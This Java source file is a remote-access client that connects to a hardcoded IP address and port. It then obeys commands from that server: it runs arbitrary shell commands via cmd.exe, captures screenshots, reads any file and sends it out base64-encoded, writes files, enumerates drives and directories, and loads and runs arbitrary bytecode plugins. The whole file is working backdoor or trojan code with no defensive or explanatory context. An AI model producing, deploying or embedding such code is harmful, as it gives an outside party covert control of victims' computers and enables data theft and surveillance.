import ParserPackage.Collection;
import ParserPackage.Parser;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class Main {
    public static void main(String[] args) throws IOException {
        if (!checkInternetConnection()) {
            System.err.println("Internet connection absent, awaiting...");
            while (!checkInternetConnection()) {}
            System.out.println("Connection established!");
        }

        System.out.println(SocketHandler.getMACAddress());

        SocketHandler socketHandler = SocketHandler.connect("3.89.196.174", 8080);
        socketHandler.setOnDataListener(data -> {
            int id = data.getId();
            if (data.getType().equals("command")) {
                String command = ((String) data.getMap().get("command")).replaceAll("\"", "^\"");
                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command("cmd.exe", "/c", "\"" + command + "\"");
                new Thread(() -> {
                    try {
                        Process process = processBuilder.start();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "CP866"));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) stringBuilder.append(line).append("\n");
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("result", stringBuilder.toString());
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (IOException e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("psl")) {
                String psl = (String) data.getMap().get("command");
                new Thread(() -> {
                    try {
                        FileWriter fileWriter = new FileWriter("program.psl");
                        fileWriter.write(psl);
                        fileWriter.close();
                        PrintStream systemOut = System.out;
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        System.setOut(new PrintStream(out));
                        Parser.interpret("program.psl");
                        System.setOut(systemOut);
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("result", out.toString());
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (Exception e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("screenshot")) {
                new Thread(() -> {
                    try {
                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                        ImageIO.write(image, "PNG", outputStream);
                        String base64 = Base64.getEncoder().encodeToString(outputStream.toByteArray());
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("base64", base64);
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (AWTException | IOException e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("get_file")) {

                new Thread(() -> {
                    try {
                        String path = (String) data.getMap().get("path");
                        File file = new File(path);
                        InputStream inputStream = new FileInputStream(file);
                        byte[] byteArray = new byte[(int) file.length()];
                        inputStream.read(byteArray);
                        String base64 = Base64.getEncoder().encodeToString(byteArray);
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("base64", base64);
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (IOException e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("write_file")) {
                new Thread(() -> {
                    try {
                        String path = (String) data.getMap().get("path");
                        String base64 = (String) data.getMap().get("base64");
                        Files.write(Paths.get(new File(path).toURI()), Base64.getDecoder().decode(base64));
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", true);
                        socketHandler.write(result.toString());
                    } catch (IOException e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("scan")) {
                new Thread(() -> {
                    String dir = (String) data.getMap().get("dir");
                    try {
                        if (!dir.equals("") && !new File(dir).isDirectory()) throw new Exception("Not a directory");
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", true);
                        result.put("result", scan(dir));
                        socketHandler.write(result.toString());
                    } catch (Exception e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            } else if (data.getType().equals("plugin")) {
                new Thread(() -> {
                    try {
                        String name = (String) data.getMap().get("name");
                        //System.out.println((String) data.getMap().get("base64"));
                        byte[] bytecode = Base64.getDecoder().decode((String) data.getMap().get("base64"));
                        //System.out.println(bytecodeToString(bytecode));
                        //System.out.println(new String(bytecode, StandardCharsets.UTF_8));
                        Class<?> clazz = new ByteCodeClassLoader(name, bytecode).loadClass(name);
                        Map<String, Object> parameters = new HashMap<>((JSONObject) data.getMap().get("parameters"));
                        Method run = clazz.getMethod("run", Map.class);
                        assert Modifier.isStatic(run.getModifiers());
                        assert Modifier.isPublic(run.getModifiers());
                        ByteArrayOutputStream output = new ByteArrayOutputStream();
                        PrintStream pluginOut = new PrintStream(output, true, "UTF-8");
                        PrintStream console = System.out;
                        System.setOut(pluginOut);
                        run.invoke(null, parameters);
                        System.setOut(console);
                        String pluginResult = new String(output.toByteArray(), StandardCharsets.UTF_8);
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", true);
                        result.put("result", pluginResult);
                        socketHandler.write(result.toString());
                    } catch (Exception e) {
                        JSONObject result = new JSONObject();
                        result.put("type", "result");
                        result.put("id", id);
                        result.put("success", false);
                        result.put("error", e.getMessage());
                        socketHandler.write(result.toString());
                        e.printStackTrace();
                    }
                }).start();
            }
        });
    }

    private static JSONArray scan(String dir) {
        JSONArray array = new JSONArray();
        for (File file : Objects.requireNonNull(dir.equals("") ? File.listRoots() : new File(dir).listFiles())) {
            JSONObject result = new JSONObject();
            result.put("name", file.getName());
            result.put("type", file.isDirectory() ? "folder" : "file");
            result.put("path", file.getAbsolutePath());
            if (file.isDirectory())
                result.put("items", file.listFiles() != null ? file.listFiles().length : -1);
            else
                result.put("size", file.length());
            array.add(result);
        }
        return array;
    }

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    private static String bytecodeToString(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }
    private static boolean checkInternetConnection() {
        try {
            Process process = java.lang.Runtime.getRuntime().exec("ping www.geeksforgeeks.org");
            return process.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }
}
